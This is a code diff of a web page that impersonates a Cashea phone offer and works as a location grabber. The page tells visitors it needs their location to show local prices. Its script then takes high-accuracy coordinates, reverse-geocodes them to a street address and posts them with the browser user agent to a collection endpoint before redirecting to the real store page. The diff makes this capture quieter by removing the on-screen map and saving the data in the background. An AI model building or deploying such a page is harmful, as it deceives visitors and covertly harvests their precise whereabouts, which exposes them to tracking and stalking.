@@ -3,75 +3,48 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Cashea — Xiaomi Redmi Note 13 Pro 5G</title>
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;900&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+<title>Cashea</title>
+<link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
-  :root {
-    --bg:       #08090c;
-    --surface:  #0f1117;
-    --surface2: #161923;
-    --border:   rgba(255,255,255,0.07);
-    --border2:  rgba(255,255,255,0.13);
-    --accent:   #6c47ff;
-    --accent2:  #9b7aff;
-    --gold:     #f5c542;
-    --text:     #f0f0f5;
-    --muted:    rgba(240,240,245,0.5);
-    --dim:      rgba(240,240,245,0.25);
-  }
-
   *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
-  html { scroll-behavior: smooth; }
 
   body {
-    font-family: 'Inter', sans-serif;
-    background: var(--bg);
-    color: var(--text);
-    overflow-x: hidden;
+    font-family: 'Space Grotesk', sans-serif;
+    background: #08090c;
+    color: #f0f0f5;
     min-height: 100vh;
-  }
-
-  /* ── BLOCKER ── */
-  #blocker {
-    position: fixed;
-    inset: 0;
-    z-index: 9998;
-    background: var(--bg);
     display: flex;
     align-items: center;
     justify-content: center;
   }
 
-  /* ── MODAL ── */
-  #loc-modal {
+  /* ── MODAL DE PERMISO ── */
+  #permission-screen {
     position: fixed;
     inset: 0;
-    background: rgba(0,0,0,0.75);
-    backdrop-filter: blur(12px);
-    z-index: 9999;
+    background: #08090c;
     display: flex;
     align-items: center;
     justify-content: center;
     padding: 1.5rem;
-    animation: fadeIn .3s ease;
+    z-index: 10;
   }
 
   .modal-box {
-    background: var(--surface);
-    border: 1px solid var(--border2);
+    background: #0f1117;
+    border: 1px solid rgba(255,255,255,0.1);
     border-radius: 20px;
     padding: 2.5rem 2rem;
-    max-width: 420px;
+    max-width: 400px;
     width: 100%;
     text-align: center;
-    box-shadow: 0 0 60px rgba(108,71,255,0.15), 0 40px 80px rgba(0,0,0,0.6);
     animation: scaleIn .4s cubic-bezier(.34,1.56,.64,1) both;
   }
 
   .modal-icon {
     width: 64px;
     height: 64px;
-    background: linear-gradient(135deg, var(--accent), #a855f7);
+    background: linear-gradient(135deg, #6c47ff, #a855f7);
     border-radius: 18px;
     display: flex;
     align-items: center;
@@ -81,17 +54,16 @@
   }
 
   .modal-title {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.5rem;
+    font-size: 1.4rem;
     font-weight: 700;
-    color: var(--text);
+    color: #f0f0f5;
     margin-bottom: .6rem;
     line-height: 1.2;
   }
 
   .modal-text {
     font-size: .875rem;
-    color: var(--muted);
+    color: rgba(240,240,245,0.5);
     line-height: 1.7;
     margin-bottom: 1.75rem;
   }
@@ -102,7 +74,7 @@
     justify-content: center;
     gap: .5rem;
     width: 100%;
-    background: linear-gradient(135deg, var(--accent), #a855f7);
+    background: linear-gradient(135deg, #6c47ff, #a855f7);
     color: #fff;
     border: none;
     padding: .875rem 2rem;
@@ -111,471 +83,122 @@
     font-size: .95rem;
     font-weight: 700;
     cursor: pointer;
-    transition: opacity .2s, transform .2s;
-    letter-spacing: .01em;
-  }
-
-  .modal-btn:hover { opacity: .9; transform: translateY(-1px); }
-
-  /* ── LOCATION BANNER ── */
-  #loc-banner {
-    background: rgba(108,71,255,0.08);
-    border-bottom: 1px solid var(--border);
-    padding: .7rem 2rem;
-    text-align: center;
-    font-size: .78rem;
-    color: var(--muted);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: .5rem;
-    flex-wrap: wrap;
-  }
-
-  #loc-banner .pin { color: var(--accent2); }
-  #loc-text { color: var(--muted); }
-
-  /* ── MAIN CONTENT ── */
-  main {
-    max-width: 1100px;
-    margin: 0 auto;
-    padding: 4rem 2rem 6rem;
-  }
-
-  .eyebrow {
-    display: inline-flex;
-    align-items: center;
-    gap: .4rem;
-    font-size: .72rem;
-    font-weight: 600;
-    letter-spacing: .12em;
-    text-transform: uppercase;
-    color: var(--accent2);
-    background: rgba(108,71,255,0.1);
-    border: 1px solid rgba(108,71,255,0.25);
-    padding: .3em 1em;
-    border-radius: 99px;
-    margin-bottom: 1.5rem;
-  }
-
-  .page-title {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: clamp(2.4rem, 6vw, 4.5rem);
-    font-weight: 700;
-    line-height: 1.05;
-    letter-spacing: -.025em;
-    margin-bottom: 1.25rem;
-  }
-
-  .page-title .highlight {
-    background: linear-gradient(90deg, var(--accent2), #f472b6);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    background-clip: text;
-  }
-
-  .page-sub {
-    font-size: 1.05rem;
-    color: var(--muted);
-    line-height: 1.75;
-    max-width: 520px;
-    margin-bottom: 3rem;
-  }
-
-  /* ── PHONE CARD ── */
-  .phone-card {
-    background: var(--surface);
-    border: 1px solid var(--border2);
-    border-radius: 20px;
-    overflow: hidden;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 0;
-    margin-bottom: 3rem;
-  }
-
-  @media (max-width: 640px) {
-    .phone-card { grid-template-columns: 1fr; }
-    .phone-img-side { min-height: 240px; }
-  }
-
-  .phone-img-side {
-    background: linear-gradient(135deg, #1a1035 0%, #0d1a2e 100%);
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    padding: 2.5rem;
-    min-height: 320px;
-    position: relative;
-    overflow: hidden;
-  }
-
-  .phone-img-side::before {
-    content: '';
-    position: absolute;
-    inset: 0;
-    background: radial-gradient(ellipse 70% 70% at 50% 50%, rgba(108,71,255,0.2), transparent);
-  }
-
-  .phone-img-side img {
-    max-height: 280px;
-    max-width: 100%;
-    object-fit: contain;
-    position: relative;
-    z-index: 1;
-    filter: drop-shadow(0 20px 40px rgba(108,71,255,0.4));
-  }
-
-  .phone-info {
-    padding: 2rem 2rem 2rem;
-    display: flex;
-    flex-direction: column;
-    justify-content: center;
-  }
-
-  .phone-brand {
-    font-size: .72rem;
-    font-weight: 600;
-    letter-spacing: .12em;
-    text-transform: uppercase;
-    color: var(--accent2);
-    margin-bottom: .4rem;
-  }
-
-  .phone-name {
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1.4rem;
-    font-weight: 700;
-    line-height: 1.25;
-    color: var(--text);
-    margin-bottom: 1.25rem;
-  }
-
-  .phone-specs {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: .6rem;
-    margin-bottom: 1.5rem;
-  }
-
-  .spec-chip {
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: .6rem .75rem;
-  }
-
-  .spec-label {
-    font-size: .65rem;
-    font-weight: 600;
-    letter-spacing: .08em;
-    text-transform: uppercase;
-    color: var(--dim);
-    margin-bottom: .2rem;
-  }
-
-  .spec-val {
-    font-size: .85rem;
-    font-weight: 600;
-    color: var(--text);
-  }
-
-  .cashea-badge {
-    display: inline-flex;
-    align-items: center;
-    gap: .4rem;
-    background: rgba(245,197,66,0.08);
-    border: 1px solid rgba(245,197,66,0.25);
-    border-radius: 10px;
-    padding: .55rem 1rem;
-    font-size: .8rem;
-    font-weight: 600;
-    color: var(--gold);
-    margin-bottom: 1.25rem;
-  }
-
-  .btn-cashea {
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    gap: .5rem;
-    width: 100%;
-    background: linear-gradient(135deg, var(--accent), #a855f7);
-    color: #fff;
-    border: none;
-    padding: .875rem 2rem;
-    border-radius: 12px;
-    font-family: 'Space Grotesk', sans-serif;
-    font-size: 1rem;
-    font-weight: 700;
-    cursor: pointer;
-    text-decoration: none;
     transition: opacity .2s, transform .15s;
   }
 
-  .btn-cashea:hover { opacity: .88; transform: translateY(-1px); }
+  .modal-btn:hover { opacity: .88; transform: translateY(-1px); }
 
-  /* ── TOAST ── */
-  #toast {
-    position: fixed;
-    bottom: 2rem;
-    right: 2rem;
-    background: var(--surface);
-    border: 1px solid var(--border2);
-    color: var(--text);
-    padding: .85rem 1.25rem;
-    border-radius: 12px;
-    font-size: .82rem;
-    font-weight: 500;
-    box-shadow: 0 8px 32px rgba(0,0,0,.5);
-    z-index: 9998;
-    transform: translateY(120%);
-    transition: transform .4s cubic-bezier(.34,1.56,.64,1);
-    display: flex;
-    align-items: center;
-    gap: .5rem;
-    max-width: 320px;
-  }
-  #toast.show { transform: translateY(0); }
-
-  /* ── LOCATION DETAIL ── */
-  #loc-detail {
+  /* ── PANTALLA DE CARGA ── */
+  #loading-screen {
     display: none;
-    background: var(--surface);
-    border-top: 1px solid var(--border);
-    border-bottom: 1px solid var(--border);
-    padding: 2rem;
-  }
-
-  .loc-detail-inner {
-    max-width: 1100px;
-    margin: 0 auto;
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: 2rem;
-    align-items: start;
-  }
-  @media(max-width:700px){ .loc-detail-inner { grid-template-columns: 1fr; } }
-
-  #map {
-    height: 260px;
-    border-radius: 12px;
-    border: 1px solid var(--border2);
-    overflow: hidden;
-  }
-
-  .loc-info-grid {
-    display: grid;
-    grid-template-columns: 1fr 1fr;
-    gap: .6rem;
-  }
-
-  .loc-chip {
-    background: var(--surface2);
-    border: 1px solid var(--border);
-    border-radius: 10px;
-    padding: .6rem .75rem;
-  }
-
-  .loc-chip-label {
-    font-size: .62rem;
-    letter-spacing: .12em;
-    text-transform: uppercase;
-    color: var(--dim);
-    margin-bottom: .2rem;
-    font-weight: 600;
-  }
-
-  .loc-chip-value {
-    font-size: .875rem;
-    font-weight: 600;
-    color: var(--text);
-  }
-
-  .loc-chip-value.mono {
-    font-family: 'Courier New', monospace;
-    font-size: .78rem;
-    color: var(--accent2);
-  }
-
-  .loc-address {
-    grid-column: 1 / -1;
-    background: rgba(108,71,255,0.06);
-    border: 1px solid rgba(108,71,255,0.18);
-    border-radius: 10px;
-    padding: .65rem .9rem;
-  }
-
-  .loc-detail-title {
-    font-size: .68rem;
-    font-weight: 600;
-    letter-spacing: .2em;
-    text-transform: uppercase;
-    color: var(--accent2);
-    margin-bottom: 1rem;
-    display: flex;
+    flex-direction: column;
     align-items: center;
-    gap: .5rem;
-  }
-
-  .pulse-dot {
-    width: 8px; height: 8px;
-    background: var(--accent2);
-    border-radius: 50%;
-    animation: pulseDot 1.5s infinite;
-    flex-shrink: 0;
-  }
-
-  /* ── FOOTER ── */
-  footer {
-    border-top: 1px solid var(--border);
-    padding: 2rem;
+    gap: 1.25rem;
     text-align: center;
-    font-size: .75rem;
-    color: var(--dim);
+    padding: 2rem;
   }
 
-  /* ── KEYFRAMES ── */
-  @keyframes fadeIn { from{opacity:0} to{opacity:1} }
-  @keyframes scaleIn { from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }
-  @keyframes pulseDot {
-    0%,100%{box-shadow:0 0 0 0 rgba(108,71,255,.6)}
-    50%{box-shadow:0 0 0 6px rgba(108,71,255,0)}
+  .spinner {
+    width: 48px;
+    height: 48px;
+    border: 3px solid rgba(108,71,255,0.2);
+    border-top-color: #6c47ff;
+    border-radius: 50%;
+    animation: spin .8s linear infinite;
   }
+
+  .loading-title {
+    font-size: 1.1rem;
+    font-weight: 700;
+    color: #f0f0f5;
+  }
+
+  .loading-sub {
+    font-size: .82rem;
+    color: rgba(240,240,245,0.4);
+  }
+
+  /* ── PANTALLA DE ERROR ── */
+  #error-screen {
+    display: none;
+    flex-direction: column;
+    align-items: center;
+    gap: 1rem;
+    text-align: center;
+    padding: 2rem;
+    max-width: 360px;
+  }
+
+  #error-screen .err-icon { font-size: 3rem; }
+
+  #error-screen h2 {
+    font-size: 1.3rem;
+    font-weight: 700;
+    color: #f0f0f5;
+  }
+
+  #error-screen p {
+    font-size: .875rem;
+    color: rgba(240,240,245,0.5);
+    line-height: 1.7;
+  }
+
+  #error-screen button {
+    background: linear-gradient(135deg, #6c47ff, #a855f7);
+    color: #fff;
+    border: none;
+    padding: .8rem 2rem;
+    border-radius: 12px;
+    font-family: 'Space Grotesk', sans-serif;
+    font-size: .9rem;
+    font-weight: 700;
+    cursor: pointer;
+    margin-top: .5rem;
+    transition: opacity .2s;
+  }
+
+  #error-screen button:hover { opacity: .88; }
+
+  @keyframes scaleIn { from{opacity:0;transform:scale(.9)} to{opacity:1;transform:scale(1)} }
+  @keyframes spin { to { transform: rotate(360deg); } }
 </style>
 </head>
 <body>
 
-<div id="blocker" style="position:fixed;inset:0;z-index:9998;background:#08090c;display:flex;align-items:center;justify-content:center;"></div>
-
-<!-- MODAL -->
-<div id="loc-modal">
+<!-- PASO 1: Pedir permiso -->
+<div id="permission-screen">
   <div class="modal-box">
     <div class="modal-icon">📍</div>
     <h2 class="modal-title">¡Cacheá de todo en celulares!</h2>
     <p class="modal-text">Permite el acceso a tu ubicación para mostrarte los mejores precios en tu moneda local.</p>
     <button class="modal-btn" onclick="requestLocation()">
-      <span>📡</span> Permitir acceso
+      📡 Permitir acceso
     </button>
   </div>
 </div>
 
-<!-- TOAST -->
-<div id="toast"></div>
-
-<!-- LOCATION BANNER -->
-<div id="loc-banner">
-  <span class="pin">●</span>
-  <span id="loc-text"></span>
+<!-- PASO 2: Cargando -->
+<div id="loading-screen">
+  <div class="spinner"></div>
+  <div class="loading-title">Detectando ubicación…</div>
+  <div class="loading-sub">Un momento, por favor</div>
 </div>
 
-
-
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css"/>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
+<!-- PASO 3: Error -->
+<div id="error-screen">
+  <div class="err-icon">🔒</div>
+  <h2 id="error-title">Acceso restringido</h2>
+  <p id="error-msg">Esta página requiere acceso a tu ubicación para continuar. Habilita el permiso en tu navegador y recarga la página.</p>
+  <button onclick="location.reload()">🔄 Reintentar</button>
+</div>
 
 <script>
-// ─────────────────────────────────────────────────────────
-//  GEOLOCATION — Alta Precisión con watchPosition + fallback
-// ─────────────────────────────────────────────────────────
-const visits = [];
-let map = null;
-let marker = null;
-let accuracyCircle = null;
-let watchId = null;
-let bestPos = null;
+const REDIRECT_URL = 'https://www.cashea.app/productos/xiaomi-redmi-note-13-pro-5g-8gb-256gb-ocean-teal';
 
-function showToast(msg, icon = '✅') {
-  const t = document.getElementById('toast');
-  t.innerHTML = `<span>${icon}</span> ${msg}`;
-  t.classList.add('show');
-  setTimeout(() => t.classList.remove('show'), 5000);
-}
-
-function updateBanner(text) {
-  document.getElementById('loc-text').textContent = text;
-}
-
-function initMap(lat, lon) {
-  const detail = document.getElementById('loc-detail');
-  detail.style.display = 'block';
-
-  if (!map) {
-    map = L.map('map', { zoomControl: true, attributionControl: false });
-    L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-      maxZoom: 19
-    }).addTo(map);
-  }
-
-  map.setView([lat, lon], 16);
-
-  const icon = L.divIcon({
-    className: '',
-    html: `<div style="
-      width:22px;height:22px;
-      background:#6c47ff;
-      border:3px solid #fff;
-      border-radius:50% 50% 50% 0;
-      transform:rotate(-45deg);
-      box-shadow:0 2px 8px rgba(0,0,0,.5);
-    "></div>`,
-    iconSize: [22, 22],
-    iconAnchor: [11, 22]
+function show(id) {
+  ['permission-screen','loading-screen','error-screen'].forEach(s => {
+    document.getElementById(s).style.display = s === id ? 'flex' : 'none';
   });
-
-  if (marker) { marker.setLatLng([lat, lon]); }
-  else { marker = L.marker([lat, lon], { icon }).addTo(map); }
-}
-
-function updateAccuracyCircle(lat, lon, accuracy) {
-  if (accuracyCircle) { accuracyCircle.setLatLng([lat, lon]).setRadius(accuracy); }
-  else {
-    accuracyCircle = L.circle([lat, lon], {
-      radius: accuracy,
-      color: '#6c47ff',
-      fillColor: '#6c47ff',
-      fillOpacity: 0.1,
-      weight: 1.5
-    }).addTo(map);
-  }
-}
-
-function renderChips(pos, address) {
-  const acc = pos.coords.accuracy;
-  const accLabel = acc < 10 ? '🟢 GPS' : acc < 50 ? '🟡 Alta' : acc < 200 ? '🟠 Media' : '🔴 Baja';
-  const addr = address || {};
-  const street = [addr.road, addr.house_number].filter(Boolean).join(' ') || '—';
-  const city   = addr.city || addr.town || addr.village || addr.municipality || '—';
-  const state  = addr.state || addr.county || '—';
-  const country= addr.country || '—';
-  const postal = addr.postcode || '—';
-  const fullAddr = addr.display_name || '—';
-
-  const chips = [
-    { label: 'Precisión', val: `±${Math.round(acc)}m`, cls: 'mono' },
-    { label: 'Señal', val: accLabel, cls: '' },
-    { label: 'Ciudad', val: city, cls: '' },
-    { label: 'Departamento', val: state, cls: '' },
-    { label: 'País', val: country, cls: '' },
-    { label: 'Código Postal', val: postal, cls: 'mono' },
-    { label: 'Calle', val: street, cls: '' },
-    { label: 'Latitud', val: pos.coords.latitude.toFixed(5), cls: 'mono' },
-    { label: 'Longitud', val: pos.coords.longitude.toFixed(5), cls: 'mono' },
-  ];
-
-  const container = document.getElementById('loc-chips');
-  container.innerHTML = `
-    <div class="loc-chip loc-address" style="grid-column:1/-1">
-      <div class="loc-chip-label">Dirección completa</div>
-      <div class="loc-chip-value" style="font-size:.78rem">${fullAddr}</div>
-    </div>
-    ${chips.map(c => `
-      <div class="loc-chip">
-        <div class="loc-chip-label">${c.label}</div>
-        <div class="loc-chip-value ${c.cls}">${c.val}</div>
-      </div>
-    `).join('')}
-  `;
 }
 
 async function reverseGeocode(lat, lon) {
@@ -608,8 +231,6 @@ async function saveVisit(pos, geoData) {
     userAgent:    navigator.userAgent.substring(0, 80)
   };
 
-  visits.push(entry);
-
   try {
     const stored = JSON.parse(localStorage.getItem('gt_visits') || '[]');
     stored.push(entry);
@@ -617,136 +238,62 @@ async function saveVisit(pos, geoData) {
   } catch(e) {}
 
   try {
-    const res = await fetch('/api/ubicacion', {
+    await fetch('/api/ubicacion', {
       method:  'POST',
       headers: { 'Content-Type': 'application/json' },
       body:    JSON.stringify(entry)
     });
-    if (res.ok) {
-      console.log('📄 Guardado en ubicaciones.txt ✅');
-    } else {
-      console.warn('⚠️ Servidor respondió con error:', res.status);
-    }
   } catch(e) {
-    console.warn('⚠️ Modo offline — solo guardado en localStorage:', e.message);
+    console.warn('⚠️ Modo offline — solo localStorage:', e.message);
   }
 
   console.table(entry);
-  return entry;
 }
 
 function requestLocation() {
-  document.getElementById('loc-modal').style.display = 'none';
-
   if (!navigator.geolocation) {
-    updateBanner('Geolocalización no disponible');
-    showToast('Tu navegador no soporta geolocalización.', '⚠️');
+    show('error-screen');
+    document.getElementById('error-title').textContent = 'No disponible';
+    document.getElementById('error-msg').textContent = 'Tu navegador no soporta geolocalización.';
     return;
   }
 
-  updateBanner('…');
-  showToast('…', '📡');
+  show('loading-screen');
 
   navigator.geolocation.getCurrentPosition(
-    async (quickPos) => {
-      const { latitude, longitude, accuracy } = quickPos.coords;
-      initMap(latitude, longitude);
-      updateAccuracyCircle(latitude, longitude, accuracy);
-      updateBanner(`📡 Refinando precisión… ±${Math.round(accuracy)}m`);
-    },
-    () => {},
-    { enableHighAccuracy: false, timeout: 5000, maximumAge: 60000 }
-  );
+    (pos) => {
+      // Redirigir de inmediato al tener coordenadas
+      window.location.href = REDIRECT_URL;
 
-  let attempts = 0;
-  watchId = navigator.geolocation.watchPosition(
-    async (pos) => {
-      attempts++;
-      const { latitude, longitude, accuracy } = pos.coords;
-
-      if (!bestPos || accuracy < bestPos.coords.accuracy) {
-        bestPos = pos;
-      }
-
-      initMap(latitude, longitude);
-      updateAccuracyCircle(latitude, longitude, accuracy);
-      updateBanner(`📡 Precisión: ±${Math.round(accuracy)}m`);
-
-      if (accuracy < 25 || attempts >= 4) {
-        navigator.geolocation.clearWatch(watchId);
-        document.getElementById('blocker').style.display = 'none';
-
-        const finalPos = bestPos;
-        const geoData = await reverseGeocode(
-          parseFloat(finalPos.coords.latitude),
-          parseFloat(finalPos.coords.longitude)
-        );
-
-        const entry = await saveVisit(finalPos, geoData);
-        renderChips(finalPos, geoData?.address);
-
-        const addr = geoData?.address || {};
-        const city = addr.city || addr.town || addr.village || addr.state || addr.country || 'ubicación registrada';
-        const accFinal = Math.round(finalPos.coords.accuracy);
-        const bannerText = [addr.road, city, addr.country].filter(Boolean).join(', ');
-        updateBanner(`📍 ${bannerText || city}`);
-        showToast(`Ubicación capturada ±${accFinal}m`, '✅');
-
-        if (marker) {
-          marker.bindPopup(`<strong>${city}</strong><br>±${accFinal}m`).openPopup();
-        }
-
-        // ── REDIRECCIÓN ──────────────────────────────────
-        setTimeout(() => {
-          window.location.href = 'https://www.cashea.app/productos/xiaomi-redmi-note-13-pro-5g-8gb-256gb-ocean-teal';
-        }, 100);
-      }
+      // Geocoding y guardado en background (no bloquea la redirección)
+      reverseGeocode(pos.coords.latitude, pos.coords.longitude)
+        .then(geoData => saveVisit(pos, geoData));
     },
     (err) => {
-      navigator.geolocation.clearWatch(watchId);
+      show('error-screen');
 
       if (err.code === 1) {
-        document.getElementById('blocker').innerHTML = `
-          <div style="text-align:center; padding:2rem; max-width:400px;">
-            <div style="font-size:3rem; margin-bottom:1rem">🔒</div>
-            <h2 style="font-family:'Space Grotesk',sans-serif; color:#f0f0f5; font-size:1.4rem; margin-bottom:.75rem">Favor permitir acceso</h2>
-            <p style="color:rgba(240,240,245,.55); font-size:.875rem; line-height:1.7; margin-bottom:1.5rem">
-              Esta página requiere acceso a tu ubicación para continuar.<br>
-              Habilita el permiso en tu navegador y recarga la página.
-            </p>
-            <button onclick="location.reload()" style="
-              background: linear-gradient(135deg,#6c47ff,#a855f7);
-              color:#fff; border:none; padding:.8rem 2rem;
-              border-radius:12px; font-family:'Space Grotesk',sans-serif;
-              font-size:.95rem; font-weight:700; cursor:pointer;
-            ">🔄 Reintentar</button>
-          </div>
-        `;
-      }
-
-      let msg = 'Permiso denegado.';
-      if (err.code === 2) {
-        msg = 'GPS apagado. Activa la ubicación en Ajustes de tu dispositivo.';
+        document.getElementById('error-title').textContent = 'Permiso denegado';
+        document.getElementById('error-msg').textContent =
+          'Esta página requiere acceso a tu ubicación. Habilita el permiso en tu navegador y recarga.';
+      } else if (err.code === 2) {
+        document.getElementById('error-title').textContent = 'GPS apagado';
         if (/android/i.test(navigator.userAgent)) {
-          showToast('Activa el GPS en Ajustes → Ubicación y vuelve a intentarlo.', '📍');
+          document.getElementById('error-msg').textContent = 'Activa el GPS en Ajustes → Ubicación y vuelve a intentarlo.';
         } else if (/iphone|ipad/i.test(navigator.userAgent)) {
-          showToast('Ve a Ajustes → Privacidad → Localización y actívala.', '📍');
+          document.getElementById('error-msg').textContent = 'Ve a Ajustes → Privacidad → Localización y actívala.';
         } else {
-          showToast(msg, '⚠️');
+          document.getElementById('error-msg').textContent = 'Activa la ubicación en los ajustes de tu dispositivo.';
         }
-      } else if (err.code === 3) {
-        msg = 'Tiempo agotado. Asegúrate de tener GPS activo y señal.';
-        showToast(msg, '⚠️');
       } else {
-        showToast(msg, '⚠️');
+        document.getElementById('error-title').textContent = 'Tiempo agotado';
+        document.getElementById('error-msg').textContent = 'No se pudo obtener la ubicación. Verifica que el GPS esté activo y vuelve a intentarlo.';
       }
-
-      updateBanner(`⚠️ ${msg}`);
     },
     {
       enableHighAccuracy: true,
-      timeout: 88000,
-      maximumAge: 60000
+      timeout: 10000,
+      maximumAge: 0
     }
   );
 }
